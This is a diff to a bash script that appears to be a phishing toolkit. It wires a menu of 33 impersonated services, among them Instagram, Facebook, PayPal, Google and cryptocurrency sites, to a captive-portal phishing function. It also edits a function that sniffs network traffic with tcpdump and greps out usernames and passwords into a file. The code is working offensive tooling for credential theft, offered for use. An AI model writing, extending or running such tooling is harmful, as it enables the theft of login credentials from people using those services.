@@ -54,39 +54,39 @@ menu() {
     echo "33. Custom"
     read -p "Enter your choice: " choice
     case $choice in
-        1) server="instagram" ;;
-        2) server="facebook" ;;
-        3) server="snapchat" ;;
-        4) server="twitter" ;;
-        5) server="github" ;;
-        6) server="google" ;;
-        7) server="spotify" ;;
-        8) server="netflix" ;;
-        9) server="paypal" ;;
-        10) server="origin" ;;
-        11) server="steam" ;;
-        12) server="yahoo" ;;
-        13) server="linkedin" ;;
-        14) server="protonmail" ;;
-        15) server="wordpress" ;;
-        16) server="microsoft" ;;
-        17) server="instafollowers" ;;
-        18) server="shopping" ;;
-        19) server="pinterest" ;;
-        20) server="cryptocurrency" ;;
-        21) server="verizon" ;;
-        22) server="dropbox" ;;
-        23) server="adobe" ;;
-        24) server="shopify" ;;
-        25) server="messenger" ;;
-        26) server="gitlab" ;;
-        27) server="twitch" ;;
-        28) server="myspace" ;;
-        29) server="badoo" ;;
-        30) server="vk" ;;
-        31) server="yandex" ;;
-        32) server="devianart" ;;
-        33) server="custom" ;;
+        1) server="instagram"; captive_portal_phishing ;;
+        2) server="facebook"; captive_portal_phishing ;;
+        3) server="snapchat"; captive_portal_phishing ;;
+        4) server="twitter"; captive_portal_phishing ;;
+        5) server="github"; captive_portal_phishing ;;
+        6) server="google"; captive_portal_phishing ;;
+        7) server="spotify"; captive_portal_phishing ;;
+        8) server="netflix"; captive_portal_phishing ;;
+        9) server="paypal"; captive_portal_phishing ;;
+        10) server="origin"; captive_portal_phishing ;;
+        11) server="steam"; captive_portal_phishing ;;
+        12) server="yahoo"; captive_portal_phishing ;;
+        13) server="linkedin"; captive_portal_phishing ;;
+        14) server="protonmail"; captive_portal_phishing ;;
+        15) server="wordpress"; captive_portal_phishing ;;
+        16) server="microsoft"; captive_portal_phishing ;;
+        17) server="instafollowers"; captive_portal_phishing ;;
+        18) server="shopping"; captive_portal_phishing ;;
+        19) server="pinterest"; captive_portal_phishing ;;
+        20) server="cryptocurrency"; captive_portal_phishing ;;
+        21) server="verizon"; captive_portal_phishing ;;
+        22) server="dropbox"; captive_portal_phishing ;;
+        23) server="adobe"; captive_portal_phishing ;;
+        24) server="shopify"; captive_portal_phishing ;;
+        25) server="messenger"; captive_portal_phishing ;;
+        26) server="gitlab"; captive_portal_phishing ;;
+        27) server="twitch"; captive_portal_phishing ;;
+        28) server="myspace"; captive_portal_phishing ;;
+        29) server="badoo"; captive_portal_phishing ;;
+        30) server="vk"; captive_portal_phishing ;;
+        31) server="yandex"; captive_portal_phishing ;;
+        32) server="devianart"; captive_portal_phishing ;;
+        33) server="custom"; captive_portal_phishing ;;
         *) echo "Invalid choice. Please try again." ;;
     esac
 }
@@ -142,8 +142,8 @@ serve_login_page() {
 # Function to capture credentials
 capture_credentials() {
     interface=$1
-    echo "Capturing credentials on interface: $interface..."
-    tcpdump -i $interface -A -s0 port http or port https | egrep -i "username=|password=|user=|pass=|login=|usr=|pwd=" > credentials.txt
+    echo "Capturing credentials on interface: $interface"
+    tcpdump -i $interface -A dst port 80 or dst port 443 | grep -i "username\|password" >> captured_credentials.txt
 }
 
 # Main script starts here
@@ -154,5 +154,5 @@ clear_terminal
 # Display the big welcome message
 big_welcome
 
-# Start the phishing menu
+# Call the menu function to start
 menu
